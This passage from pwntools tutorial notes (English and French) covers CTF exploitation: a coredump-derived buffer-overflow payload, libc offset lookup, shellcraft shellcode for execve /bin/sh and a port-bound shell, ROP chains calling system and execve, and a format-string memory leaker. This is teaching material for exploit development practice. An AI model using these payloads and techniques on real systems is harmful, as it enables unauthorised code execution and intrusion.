    io.gdb.continue_and_wait()

    text_ptr = io.gdb.parse_and_eval('$rdi').cast(gdb.lookup_type('int'))
    text = io.gdb.selected_inferior().read_memory(text_ptr, 20)

    print(text)

    io.gdb.quit()
</code></pre>
<h1 id="elf---coredumps"><a class="header" href="#elf---coredumps">ELF - coredumps</a></h1>
<pre><code class="language-python">exe = ELF('./chall')
io = exe.process()

# crash the process
io.sendline(cyclic(256))
# wait until the process terminated
io.poll()

# lookup core dump
core = io.corefile

# access value of rip in core file
payload = flat({
    cyclic_find(core.rip): exe.symbols.win
})
# core.fault_addr or core.signal available

io = exe.process()
io.sendline(payload)
io.interactive()
</code></pre>
<h1 id="elf---libc"><a class="header" href="#elf---libc">ELF - libc</a></h1>
<pre><code class="language-python">context.clear()
context.timeout = 1
context.binary = './chall'
</code></pre>
<pre><code class="language-python">libc = exe.libc
</code></pre>
<pre><code>[*] '/usr/lib/x86_64-linux-gnu/libc-2.31.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    SHSTK:    Enabled
    IBT:      Enabled
</code></pre>
<pre><code class="language-python"># Find return address from `main`
hex(libc.libc_start_main_return)
</code></pre>
<pre><code>0x24083
</code></pre>
<h1 id="libcdb"><a class="header" href="#libcdb">LIBCDB</a></h1>
<ul>
<li>interface with https://libc.rip/ and https://gitlab.com/libcdb/libcdb</li>
<li><code>libcdb</code> module as well as command line tool</li>
</ul>
<pre><code>$ libcdb file /lib/x86_64-linux-gnu/libc.so.6
[*] libc.so.6
    Version:     2.31
    BuildID:     1878e6b475720c7c51969e69ab2d276fae6d1dee
    MD5:         5898fac5d2680d0d8fefdadd632b7188
    SHA1:        1430c57bf7ca6bd7f84a11c2cb7580fc39da07f5
    SHA256:      80378c2017456829f32645e6a8f33b4c40c8efa87db7e8c931a229afa7bf6712
    Symbols:
        __libc_start_main_ret = 0x24083
                         dup2 = 0x10e8c0
                       printf = 0x61c90
                         puts = 0x84420
                         read = 0x10dfc0
                   str_bin_sh = 0x1b45bd
                       system = 0x52290
                        write = 0x10e060
</code></pre>
<h1 id="libcdb-commandline"><a class="header" href="#libcdb-commandline">LIBCDB commandline</a></h1>
<ul>
<li>lookup by buildid
<ul>
<li><code>libcdb hash 1878e6b475720c7c51969e69ab2d276fae6d1dee</code></li>
</ul>
</li>
<li>lookup by id
<ul>
<li><code>libcdb hash -t id libc6_2.31-0ubuntu9.9_amd64</code></li>
</ul>
</li>
<li>lookup by leaked offsets
<ul>
<li><code>libcdb lookup printf c90 system 0x52290</code></li>
</ul>
</li>
<li>download matching libc
<ul>
<li><code>libcdb hash -t id --download-libc libc6_2.31-0ubuntu9.9_amd64</code></li>
</ul>
</li>
<li>unstrip / add back debug symbols
<ul>
<li><code>libcdb file --unstrip libc.so.6</code></li>
</ul>
</li>
</ul>
<h1 id="libcdb-module"><a class="header" href="#libcdb-module">LIBCDB module</a></h1>
<pre><code class="language-python"># Download libc and return path to it
libcdb.search_by_build_id('1878e6b475720c7c51969e69ab2d276fae6d1dee', unstrip=True)

# Unstrip any binary in place
libcdb.unstrip_libc('./libc.so.6')
</code></pre>
<h2 id="lookup-by-leaked-function-offsets"><a class="header" href="#lookup-by-leaked-function-offsets">Lookup by leaked function offsets</a></h2>
<ul>
<li>with interactive prompt on multiple matches</li>
</ul>
<pre><code class="language-python">libc = ELF(libcdb.search_by_symbol_offsets({'puts': puts_leak, 'printf': printf_leak}))
</code></pre>
<h1 id="assembly--disassembly"><a class="header" href="#assembly--disassembly">Assembly / Disassembly</a></h1>
<ul>
<li>shortcut for binutils</li>
<li>cross-architecture</li>
<li><strong>shellcraft</strong> - shellcode templates</li>
</ul>
<pre><code class="language-python">asm('mov rax, 1; syscall')
</code></pre>
<pre><code>b'H\xc7\xc0\x01\x00\x00\x00\x0f\x05'
</code></pre>
<pre><code class="language-python">asm('push 0x41414141; lea edi, [esp+0x10]', os='linux', arch='i386', bits='32')
</code></pre>
<pre><code>b'hAAAA\x8d|$\x10'
</code></pre>
<pre><code class="language-python">asm('ldr x1, [x2]', arch='arm64')
</code></pre>
<pre><code>b'A\x00@\xf9'
</code></pre>
<pre><code class="language-python">print(disasm(asm('mov rax, 1; syscall')))
</code></pre>
<pre><code>   0:   48 c7 c0 01 00 00 00    mov    rax, 0x1
   7:   0f 05                   syscall
</code></pre>
<h1 id="shellcraft"><a class="header" href="#shellcraft">Shellcraft</a></h1>
<ul>
<li>(mostly) null-byte and newline free shellcode</li>
<li>generated dynamically for real values at runtime</li>
<li>uses mako template engine</li>
</ul>
<pre><code class="language-python">print(shellcraft.linux.dupio())
</code></pre>
<pre><code>    /* dup() file descriptor rbp into stdin/stdout/stderr */
    mov rdi, rbp
    push 2
    pop rsi
loop_1:
    /* dup2(fd='rdi', fd2='rsi') */
    /* setregs noop */
    /* call dup2() */
    push SYS_dup2 /* 0x21 */
    pop rax
    syscall
    dec rsi
    jns loop_1
</code></pre>
<h1 id="rop"><a class="header" href="#rop">ROP</a></h1>
<ul>
<li>based on ROPgadget</li>
</ul>
<pre><code class="language-python">exe = ELF('./chall', checksec=False)
rop = ROP(exe)

# set registers
rop.rdi = 5
# multiple at once
rop(rsi=0x41414141, r15=0xcafe)

print(rop.dump())
</code></pre>
<pre><code>[*] Loading gadgets for '/mnt/c/Users/Jannik/Downloads/ctfs/pwntools_tips/chall'
0x0000:         0x4013a3 pop rdi; ret
0x0008:              0x5
0x0010:         0x4013a1 pop rsi; pop r15; ret
0x0018:       0x41414141
0x0020:           0xcafe
</code></pre>
<pre><code class="language-python"># Lookup gadgets as attributes
rop.rsi_r15
</code></pre>
<pre><code>Gadget(0x4013a1, ['pop rsi', 'pop r15', 'ret'], ['rsi', 'r15'], 0x18)
</code></pre>
<h1 id="rop-1"><a class="header" href="#rop-1">ROP</a></h1>
<pre><code class="language-python">libc = ELF('/usr/lib/x86_64-linux-gnu/libc-2.31.so')
</code></pre>
<pre><code class="language-python">rop = ROP([exe, libc])

# manual call
rop.call(0xaaaaaa, [1234, 5678])

# shorthand
rop.system(next(exe.libc.search(b'/bin/sh')))

print(rop.dump())
</code></pre>
<pre><code>[*] Loading gadgets for '/usr/lib/x86_64-linux-gnu/libc-2.31.so'
0x0000:         0x4013a3 pop rdi; ret
0x0008:            0x4d2 [arg0] rdi = 1234
0x0010:          0x2601f pop rsi; ret
0x0018:           0x162e [arg1] rsi = 5678
0x0020:         0xaaaaaa
0x0028:         0x4013a3 pop rdi; ret
0x0030:         0x1b45bd [arg0] rdi = 1787325
0x0038:          0x52290 system
</code></pre>
<h1 id="memory-leaker"><a class="header" href="#memory-leaker">Memory leaker</a></h1>
<pre><code class="language-python">pwnlib.memleak.MemLeak(f, search_range=20, reraise=True, relative=False)
</code></pre>
<ul>
<li>Caches leaked data</li>
<li>Tries surrounding address if leak failed</li>
</ul>
<pre><code class="language-python">@MemLeak
def leaker(addr):
    to_leak = p64(addr)
    if b'\n' in to_leak:
        return None
    io.sendlineafter(b'&gt; ', b'%08$7xAA' + to_leak)
    return unhex(io.recvuntil(b'AA', drop=True))

# leak from starting address
leaker(0x4000102)
# leak an address range
leaker[0x4000102:0x4000112]
# unpack right away
leaker.u64(exe.got.puts)
</code></pre>
<p><img src="pentest/pwntools/./logo.png" alt="logo" /></p>
<h1 id="pwning-meetup-2"><a class="header" href="#pwning-meetup-2">PWNing Meetup #2</a></h1>
<p><img src="pentest/pwntools/./pwntools_discord.png" alt="logo" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="pwntools"><a class="header" href="#pwntools">PwnTools</a></h1>
<h2 id="installation"><a class="header" href="#installation">Installation</a></h2>
<pre><code class="language-shell">$ pip3 install pwntools 
</code></pre>
<h2 id="exploit-de-code"><a class="header" href="#exploit-de-code">Exploit de code</a></h2>
<pre><code class="language-shell">$ pwn asm &quot;jmp esp&quot;
$ pwn asm -i &lt;filepath&gt;
</code></pre>
<h2 id="check-secu"><a class="header" href="#check-secu">Check secu</a></h2>
<pre><code class="language-shell">$ pwn checksec &lt;executable&gt;
[*] '&lt;executable&gt;'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
</code></pre>
<h2 id="motif-cyclic"><a class="header" href="#motif-cyclic">Motif (cyclic)</a></h2>
<p>Obtenez un motif</p>
<pre><code class="language-shell">$ pwn cyclic 30
aaaabaaacaaadaaaeaaafaaagaaaha
$ echo &quot;prefix_$(cyclic 13)_suffix&quot;
prefix_aaaabaaacaaad_suffix
</code></pre>
<h2 id="debug"><a class="header" href="#debug">Debug</a></h2>
<p>Attacher GDB à un processus</p>
<pre><code class="language-shell"># Start and attach to binary
$ pwn debug --exec /bin/bash
# Attach to PPID
$ pwn debug --pid 1234
# Attach to current `bash`
$ pwn debug --process bash
</code></pre>
<h2 id="désactiver-nx"><a class="header" href="#désactiver-nx">Désactiver nx</a></h2>
<p>Désactive nx d'un binaire</p>
<pre><code class="language-shell">$ pwn disablenx &lt;filepath&gt;
</code></pre>
<h2 id="pwn-disasm"><a class="header" href="#pwn-disasm">Pwn disasm</a></h2>
<p>Désassemble les opcodes hexadécimaux</p>
<pre><code class="language-shell">$ pwn disasm ffe4
</code></pre>
<p>Peut sélectionner:</p>
<ul>
<li>contexte (16,32,64,linux,windows...)</li>
<li>adresse de base</li>
<li>couleur (par défaut)/pas de couleur</li>
</ul>
<h2 id="pwn-elfdiff"><a class="header" href="#pwn-elfdiff">Pwn elfdiff</a></h2>
<p>Affiche les différences entre 2 fichiers</p>
<pre><code class="language-shell">$ pwn elfdiff &lt;file1&gt; &lt;file2&gt;
</code></pre>
<h2 id="pwn-hex"><a class="header" href="#pwn-hex">Pwn hex</a></h2>
<p>Obtenez la représentation hexadécimale et inverse</p>
<pre><code class="language-shell">$ pwn hex hola #Get hex of &quot;hola&quot; ascii
686f6c61
$ pwn unhex 686f6c61
hola
</code></pre>
<h2 id="pwn-phd"><a class="header" href="#pwn-phd">Pwn phd</a></h2>
<p>Obtenir le hexdump</p>
<pre><code class="language-shell">$ pwn phd &lt;file&gt;
</code></pre>
<p>Peut sélectionner:</p>
<ul>
<li>Nombre d'octets à afficher</li>
<li>Nombre d'octets par ligne à mettre en évidence</li>
<li>Ignorer les octets au début</li>
</ul>
<h2 id="pwn-shellcraft"><a class="header" href="#pwn-shellcraft">Pwn shellcraft</a></h2>
<p>Obtenir des shellcodes</p>
<pre><code class="language-shell">#List shellcodes
$ pwn shellcraft -l

#Shellcode with amd in the name
$ pwn shellcraft -l amd 

#Create in C and run
$ pwn shellcraft -f hex amd64.linux.sh

#Run to test. Get shell
$ pwn shellcraft -r amd64.linux.sh

#Bind SH to port
$ pwn shellcraft .r amd64.linux.bindsh 9095 
</code></pre>
<p>Peut sélectionner:</p>
<ul>
<li>shellcode et arguments pour le shellcode</li>
<li>Fichier de sortie</li>
<li>Format de sortie</li>
<li>déboguer (attacher dbg au shellcode)</li>
<li>avant (piéger le débogage avant le code)</li>
<li>après</li>
<li>éviter d'utiliser des opcodes (par défaut: non nul et nouvelle ligne)</li>
<li>Exécuter le shellcode</li>
<li>Couleur/sans couleur</li>
<li>lister les appels système</li>
<li>lister les shellcodes possibles</li>
<li>Générer un ELF en tant que bibliothèque partagée</li>
</ul>
<h2 id="modèle-pwn"><a class="header" href="#modèle-pwn">Modèle Pwn</a></h2>
<p>Obtenez un modèle Python</p>
<pre><code class="language-shell">$ pwn template
...
</code></pre>
<pre><code class="language-python">#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './path/to/binary'

# Many built-in settings can be controlled on the command-line and show up
# in &quot;args&quot;.  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()
</code></pre>
<h2 id="mise-à-jour"><a class="header" href="#mise-à-jour">Mise à jour</a></h2>
<p>Pour mettre à jour pwntools</p>
<pre><code class="language-shell">$ pwn update
</code></pre>
<h2 id="best-practice"><a class="header" href="#best-practice">Best practice</a></h2>
<p>Start <code>pwntools</code> then waiting for start <code>gdb</code>:</p>
<pre><code class="language-python">from pwn import *

local_file = './some_example_elf'
p = gdb.debug(local_file)

# ... the rest of your exploit
NO_INTERACTION = True
if NO_INTERACTION:
    # For waiting GDB manual starting but close interactive action
    p.wait()
else:
    # For waiting GDB manual starting and open interactive action
    p.interactive()

# [+] Starting local process '/challenge/some_example_elf': pid 226
# [*] Paused (press any to continue)
</code></pre>
<ul>
<li>Start <code>GDB</code></li>
</ul>
<blockquote>
<p>gdb -p <strong>&lt;PID&gt;</strong> # 226</p>
</blockquote>
<div style="break-before: page; page-break-before: always;"></div><h1 id="table-of-contents"><a class="header" href="#table-of-contents">Table of Contents</a></h1>
<ul>
<li><a href="pentest/pwntools/assembly/index.html#assembly">Assembly</a>
<ul>
<li><a href="pentest/pwntools/assembly/index.html#basic-assembly">Basic Assembly</a></li>
<li><a href="pentest/pwntools/assembly/index.html#canned-assembly-shellcraft">Canned assembly (shellcraft)</a></li>
<li><a href="pentest/pwntools/assembly/index.html#command-line-tools">Command-line Tools</a>
<ul>
<li><a href="pentest/pwntools/assembly/index.html#asm">asm </a></li>
<li><a href="pentest/pwntools/assembly/index.html#disasm">disasm </a></li>
<li><a href="pentest/pwntools/assembly/index.html#shellcraft">shellcraft </a></li>
</ul>
</li>
<li><a href="pentest/pwntools/assembly/index.html#foreign-architectures">Foreign Architectures</a>
<ul>
<li><a href="pentest/pwntools/assembly/index.html#canned-assembly">Canned Assembly</a></li>
<li><a href="pentest/pwntools/assembly/index.html#command-line-tools-1">Command-line Tools</a></li>
</ul>
</li>
</ul>
</li>
</ul>
<h1 id="assembly"><a class="header" href="#assembly">Assembly</a></h1>
<p>Pwntools makes it very easy to perform assembly in almost any architecture, and comes with a wide variety of canned-but-customizable shellcode ready to go out-of-the-box.</p>
<p>In the <a href="pentest/pwntools/assembly/walkthrough"><code>walkthrough</code></a> directory, there are several longer shellcode tutorials.  This page gives you the basics.</p>
<h2 id="basic-assembly"><a class="header" href="#basic-assembly">Basic Assembly</a></h2>
<p>The most basic example, is to convert assembly into shellcode.</p>
<pre><code class="language-py">from pwn import *

print repr(asm('xor edi, edi'))
# '1\xff'

print enhex(asm('xor edi, edi'))
# 31ff
</code></pre>
<h2 id="canned-assembly-shellcraft"><a class="header" href="#canned-assembly-shellcraft">Canned assembly (<code>shellcraft</code>)</a></h2>
<p>The <code>shellcraft</code> module gives you pre-canned assembly.  It is generally customizable.  The easiest way to find out which <code>shellcraft</code> templates exist is to look at the <a href="https://pwntools.readthedocs.org/en/latest/shellcraft.html">documentation on RTD</a>.</p>
<pre><code class="language-py">from pwn import *
help(shellcraft.sh)
print '---'
print shellcraft.sh()
print '---'
print enhex(asm(shellcraft.sh()))
</code></pre>
<pre><code>Help on function sh in module pwnlib.shellcraft.internal:

sh()
    Execute /bin/sh
---
    /* push '/bin///sh\x00' */
    push 0x68
    push 0x732f2f2f
    push 0x6e69622f

    /* call execve('esp', 0, 0) */
    push (SYS_execve) /* 0xb */
    pop eax
    mov ebx, esp
    xor ecx, ecx
    cdq /* edx=0 */
    int 0x80
---
6a68682f2f2f73682f62696e6a0b5889e331c999cd80
</code></pre>
<h2 id="command-line-tools"><a class="header" href="#command-line-tools">Command-line Tools</a></h2>
<p>There are three command-line tools for interacting with assembly:</p>
<ul>
<li><code>asm</code></li>
<li><code>disasm</code></li>
<li><code>shellcraft</code></li>
</ul>
<h3 id="asm"><a class="header" href="#asm"><code>asm</code></a></h3>
<p>The asm tool does what it says on the tin.  It provides several options for formatting the output.  When the output is a terminal, it defaults to hex-encoded.</p>
<pre><code>$ asm nop
90
</code></pre>
<p>When the output is anything else, it writes the raw data.</p>
<pre><code>$ asm nop | xxd
0000000: 90                                       .
</code></pre>
<p>It also takes data on stdin if no instructions are provided on the command line.</p>
<pre><code>$ echo 'push ebx; pop edi' | asm
535f
</code></pre>
<p>Finally, it supports a few different options for specifying the output format, via the <code>--format</code> option.  Supported arguments are <code>raw</code>, <code>hex</code>, <code>string</code>, and <code>elf</code>.</p>
<pre><code>$ asm --format=elf 'int3' &gt; ./int3
$ ./halt
Trace/breakpoint trap (core dumped)
</code></pre>
<h3 id="disasm"><a class="header" href="#disasm"><code>disasm</code></a></h3>
<p>Disasm is the opposite of <code>asm</code>.</p>
<pre><code>$ disasm cd80
   0:    cd 80                    int    0x80
$ asm nop | disasm
   0:    90                       nop
</code></pre>
<h3 id="shellcraft-1"><a class="header" href="#shellcraft-1"><code>shellcraft</code></a></h3>
<p>The <code>shellcraft</code> command is the command-line interface to the internal <code>shellcraft</code> module.  On the command-line, the full context must be specified, in the order of <code>arch.os.template</code>.</p>
<pre><code>$ shellcraft i386.linux.sh
6a68682f2f2f73682f62696e6a0b5889e331c999cd80
</code></pre>
<h2 id="foreign-architectures"><a class="header" href="#foreign-architectures">Foreign Architectures</a></h2>
<p>Assembling for a foreign architecture requires that you have an appropriate version of <code>binutils</code> installed.  You should see <a href="pentest/pwntools/assembly/installing.html">installing.md</a> for more information on this.  The only change that is necessary is to set the architecture in the global context variable.  You can see more information about <code>context</code> in <a href="pentest/pwntools/assembly/context.html">context.md</a>.</p>
<pre><code class="language-py">from pwn import *

context.arch = 'arm'

print repr(asm('mov r0, r1'))
# '\x01\x00\xa0\xe1'

print enhex(asm('mov r0, r1'))
# 0100a0e1
</code></pre>
<h3 id="canned-assembly"><a class="header" href="#canned-assembly">Canned Assembly</a></h3>
<p>The <code>shellcraft</code> module automatically switches to the appropriate architecture.</p>
<pre><code class="language-py">from pwn import *

context.arch = 'arm'

print shellcraft.sh()
print enhex(asm(shellcraft.sh()))
</code></pre>
<pre><code>    adr r0, bin_sh
    mov r2, #0
    mov r1, r2
    svc SYS_execve
bin_sh: .asciz &quot;/bin/sh&quot;

08008fe20020a0e30210a0e10b0000ef2f62696e2f736800
</code></pre>
<h3 id="command-line-tools-1"><a class="header" href="#command-line-tools-1">Command-line Tools</a></h3>
<p>You can also use the command line to assemble foreign-arch shellcode, by using the <code>--context</code> command-line option.</p>
<pre><code>$ asm --context=arm 'mov r0, r1'
0100a0e1
$ shellcraft arm.linux.sh
08008fe20020a0e30210a0e10b0000ef2f62696e2f736800
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="table-of-contents-1"><a class="header" href="#table-of-contents-1">Table of Contents</a></h1>
<ul>
<li><a href="pentest/pwntools/ROP/index.html#background">Background</a></li>
<li><a href="pentest/pwntools/ROP/index.html#loading-an-elf">Loading an ELF</a>
<ul>
<li><a href="pentest/pwntools/ROP/index.html#fixing-addresses">Fixing Addresses</a></li>
</ul>
</li>
<li><a href="pentest/pwntools/ROP/index.html#inspecting-gadgets">Inspecting Gadgets</a></li>
<li><a href="pentest/pwntools/ROP/index.html#viewing-all-gadgets">Viewing All Gadgets</a>
<ul>
<li><a href="pentest/pwntools/ROP/index.html#really-viewing-all-gadgets">Really viewing <em>ALL</em> Gadgets</a></li>
</ul>
</li>
<li><a href="pentest/pwntools/ROP/index.html#adding-raw-data">Adding Raw Data</a></li>
<li><a href="pentest/pwntools/ROP/index.html#dumping-rop-stacks">Dumping ROP stacks</a></li>
<li><a href="pentest/pwntools/ROP/index.html#extracting-raw-bytes">Extracting Raw Bytes</a></li>
<li><a href="pentest/pwntools/ROP/index.html#calling-functions-manually">Calling Functions Magically</a>
<ul>
<li><a href="pentest/pwntools/ROP/index.html#calling-functions-by-name">Calling Functions by Name</a></li>
</ul>
</li>
<li><a href="pentest/pwntools/ROP/index.html#multiple-elfs">Multiple ELFs</a></li>
<li><a href="pentest/pwntools/ROP/index.html#getting-a-shell">Getting a shell</a></li>
</ul>
<h1 id="background"><a class="header" href="#background">Background</a></h1>
<p>Return-oriented programming (ROP) is a technique for bypassing NX (no-execute, also known as Data Execution Prevention (DEP)).</p>
<p>Pwntools has several features that make ROP exploitation simpler, but only works on i386 and amd64 architectures.</p>
<h1 id="loading-an-elf"><a class="header" href="#loading-an-elf">Loading an ELF</a></h1>
<p>To create a <code>ROP</code> object, just pass it an <code>ELF</code> file.</p>
<pre><code class="language-py">elf = ELF('/bin/sh')
rop = ROP(elf)
</code></pre>
<p>This will automatically load the binary, and extract most simple gadgets from it.  For example, if you want to load the <code>rbx</code> register:</p>
<pre><code>rop.rbx
# Gadget(0x5fd5, ['pop rbx', 'ret'], ['rbx'], 0x8)
</code></pre>
<h2 id="fixing-addresses"><a class="header" href="#fixing-addresses">Fixing Addresses</a></h2>
<p>Here we can see the address of the gadget, the contents of its disassembly, what register it loads, and by how much the stack is adjusted when the gadget is executed.</p>
<p>Since in our example, <code>/bin/sh</code> is position-independent (i.e. uses ASLR), we can adjust the load address on the ELF object first.</p>
<pre><code>elf.address = 0xff000000
rop = ROP(elf)
rop.rbx
# Gadget(0xff005fd5, ['pop rbx', 'ret'], ['rbx'], 0x8)
</code></pre>
<h1 id="inspecting-gadgets"><a class="header" href="#inspecting-gadgets">Inspecting Gadgets</a></h1>
<p>You can ask the ROP object how to load any register you want, through magic accessors.  We used <code>rbx</code> above, but we can also look for other registers.</p>
<pre><code>rop.rbx
# Gadget(0xff005fd5, ['pop rbx', 'ret'], ['rbx'], 0x8)
</code></pre>
<p>If the register cannot be loaded, the return value is <code>None</code>.  In our example, there are no <code>pop rcx; ret</code> gadgets for example.</p>
<pre><code>rop.rcx
# None
</code></pre>
<h2 id="viewing-all-gadgets"><a class="header" href="#viewing-all-gadgets">Viewing All Gadgets</a></h2>
<p>Pwntools intentionally excludes most non-trivial gadgets, but you can see a list of what it has loaded by looking at the <code>ROP.gadgets</code> property, which maps the address of  a gadget to the gadget itself.</p>
<pre><code>rop.gadgets
# {4278225723: Gadget(0xff008b3b, ['add esp, 0x10', 'pop rbx', 'pop rbp', 'pop r12', 'ret'], ['rbx', 'rbp', 'r12'], 0x20),
#  4278278088: Gadget(0xff0157c8, ['add esp, 0x130', 'pop rbp', 'ret'], ['rbp'], 0x138),
#  4278284789: Gadget(0xff0171f5, ['add esp, 0x138', 'pop rbx', 'pop rbp', 'ret'], ['rbx', 'rbp'], 0x144),
#  4278272966: Gadget(0xff0143c6, ['add esp, 0x18', 'ret'], [], 0x1c),
#  4278239612: Gadget(0xff00c17c, ['add esp, 0x20', 'pop rbx', 'pop rbp', 'pop r12', 'ret'], ['rbx', 'rbp', 'r12'], 0x30),
#  4278259611: Gadget(0xff010f9b, ['add esp, 0x28', 'pop rbp', 'pop r12', 'ret'], ['rbp', 'r12'], 0x34),
# ...
#  4278216828: Gadget(0xff00687c, ['pop rsp', 'pop r13', 'ret'], ['rsp', 'r13'], 0xc),
#  4278214225: Gadget(0xff005e51, ['pop rsp', 'ret'], ['rsp'], 0x8),
#  4278210586: Gadget(0xff00501a, ['ret'], [], 0x4)}
</code></pre>
<h2 id="really-viewing-all-gadgets"><a class="header" href="#really-viewing-all-gadgets">Really Viewing <em>ALL</em> Gadgets</a></h2>
<p>Pwntools ROP filters out non-trivial gadgets, so if it doesn't have something you want, we recommend using ROPGadget to inspect the binary.</p>
<h1 id="adding-raw-data"><a class="header" href="#adding-raw-data">Adding Raw Data</a></h1>
<p>In order to add raw data to the ROP stack, simply call <code>ROP.raw()</code>.</p>
<pre><code class="language-py">rop.raw(0xdeadbeef)
rop.raw(0xcafebabe)
rop.raw('asdf')
</code></pre>
<h1 id="dumping-rop-stacks"><a class="header" href="#dumping-rop-stacks">Dumping ROP stacks</a></h1>
<p>Now that we have some gadgets, let's look at what's on the ROP stack:</p>
<pre><code class="language-py">print(rop.dump())
# 0x0000:       0xdeadbeef
# 0x0004:       0xcafebabe
# 0x0008:          b'asdf' 'asdf'
</code></pre>
<h1 id="extracting-the-raw-bytes"><a class="header" href="#extracting-the-raw-bytes">Extracting the Raw Bytes</a></h1>
<p>Now that we have a ROP stack, we want the raw bytes out of it.  Use the <code>bytes()</code> method  to do this.</p>
<pre><code class="language-py">print(hexdump(bytes(rop)))
# 00000000  ef be ad de  be ba fe ca  61 73 64 66               │····│····│asdf│
# 0000000c
</code></pre>
<h1 id="calling-functions-magically"><a class="header" href="#calling-functions-magically">Calling Functions Magically</a></h1>
<p>The real power of Pwntools' ROP tooling is the ability to invoke arbitrary functions, either via magic accessors or via the <code>ROP.call()</code> routine.</p>
<pre><code>elf = ELF('/bin/sh')
rop = ROP(elf)
rop.call(0xdeadbeef, [0, 1])
print(rop.dump())
# 0x0000:       0xdeadbeef 0xdeadbeef(0, 1, 2, 3)
# 0x0004:          b'baaa' &lt;return address&gt;
# 0x0008:              0x0 arg0
# 0x000c:              0x1 arg1
</code></pre>
<p>Notice here that it's using a 32-bit ABI, which is not correct.  We can also do ROP against 64-bit binaries, but we need to set <code>context.arch</code> accordingly.  We can use <code>context.binary</code> to do this automagically.</p>
<pre><code>context.binary = elf = ELF('/bin/sh')
rop = ROP(elf)
rop.call(0xdeadbeef, [0, 1])
print(rop.dump())
# 0x0000:           0x61aa pop rdi; ret
# 0x0008:              0x0 [arg0] rdi = 0
# 0x0010:           0x5f73 pop rsi; ret
# 0x0018:              0x1 [arg1] rsi = 1
# 0x0020:       0xdeadbeef
</code></pre>
<h1 id="calling-functions-by-name"><a class="header" href="#calling-functions-by-name">Calling Functions by Name</a></h1>
<p>If your library has a function you want to call in its GOT/PLT, or there are symbols for the binary, you can invoke function names directly.</p>
<pre><code>context.binary = elf = ELF('/bin/sh')
rop = ROP(elf)
rop.execve(0xdeadbeef)
print(rop.dump())
# 0x0000:           0x61aa pop rdi; ret
# 0x0008:       0xdeadbeef [arg0] rdi = 3735928559
# 0x0010:           0x5824 execve
</code></pre>
<h1 id="multiple-elfs"><a class="header" href="#multiple-elfs">Multiple ELFs</a></h1>
<p>Generally, more than one ELF is available in the address space of your process at a time.  Let's look at an example that uses <code>/bin/sh</code> as well as its <code>libc</code>.  Originally, we looked at <code>rop.rcx</code> and it was <code>None</code>, since there is no <code>pop rcx; ret</code> gadget in bash.  However, now we have all of the gadgets from <code>libc</code> available as well.</p>
<pre><code class="language-py">context.binary = elf = ELF('/bin/sh')
libc = elf.libc

elf.address = 0xAA000000
libc.address = 0xBB000000

rop.rax
# Gadget(0xaa00eb87, ['pop rax', 'ret'], ['rax'], 0x10)
rop.rbx
# Gadget(0xaa005fd5, ['pop rbx', 'ret'], ['rbx'], 0x10)
rop.rcx
# Gadget(0xbb09f822, ['pop rcx', 'ret'], ['rcx'], 0x10)
rop.rdx
# Gadget(0xbb117960, ['pop rdx', 'add rsp, 0x38', 'ret'], ['rdx'], 0x48)
</code></pre>
<p>Notice how the <code>rax</code> and <code>rbx</code> gadgets are in the main binary (0xAA...) while the second two are in libc (0xBB...).</p>
<p>Now let's do a more complex call!</p>
<pre><code class="language-py">rop.memcpy(0xaaaaaaaa, 0xbbbbbbbb, 0xcccccccc)
print(rop.dump())
# 0x0000:       0xbb11c1e1 pop rdx; pop r12; ret
# 0x0008:       0xcccccccc [arg2] rdx = 3435973836
# 0x0010:      b'eaaafaaa' &lt;pad r12&gt;
# 0x0018:       0xaa0061aa pop rdi; ret
# 0x0020:       0xaaaaaaaa [arg0] rdi = 2863311530
# 0x0028:       0xaa005f73 pop rsi; ret
# 0x0030:       0xbbbbbbbb [arg1] rsi = 3149642683
# 0x0038:       0xaa0058a4 memcpy
</code></pre>
<p>Note that Pwntools was able to use the <code>pop rdx; pop r12; ret</code> gadget, and account for the extra value needed on the stack.   Also note that the symbolic value of each item is listen  in <code>rop.dump()</code>.  For  example, it shows that we are settings rdx=3435973836.</p>
<h1 id="getting-a-shell"><a class="header" href="#getting-a-shell">Getting a shell</a></h1>
<p>Sometimes, getting a shell can be pretty easy!  Let's call <code>execve</code> directly, and find an instance of <code>&quot;/bin/sh\x00&quot;</code> to pass as the first argument from somewhere within memory.</p>
<pre><code class="language-py">context.binary = elf = ELF('/bin/sh')
libc = elf.libc

elf.address = 0xAA000000
libc.address = 0xBB000000

rop = ROP([elf, libc])

binsh = next(libc.search(b&quot;/bin/sh\x00&quot;))
rop.execve(binsh, 0, 0)
</code></pre>
<p>Show our ROP stack</p>
<pre><code class="language-py">print(rop.dump())
# 0x0000:       0xbb11c1e1 pop rdx; pop r12; ret
# 0x0008:              0x0 [arg2] rdx = 0
# 0x0010:      b'eaaafaaa' &lt;pad r12&gt;
# 0x0018:       0xaa0061aa pop rdi; ret
# 0x0020:       0xbb1b75aa [arg0] rdi = 3139138986
# 0x0028:       0xaa005f73 pop rsi; ret
# 0x0030:              0x0 [arg1] rsi = 0
# 0x0038:       0xaa005824 execve
</code></pre>
<p>Extract the raw bytes for the ROP</p>
<pre><code class="language-py">print(hexdump(bytes(rop)))
# 00000000  e1 c1 11 bb  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
# 00000010  65 61 61 61  66 61 61 61  aa 61 00 aa  00 00 00 00  │eaaa│faaa│·a··│····│
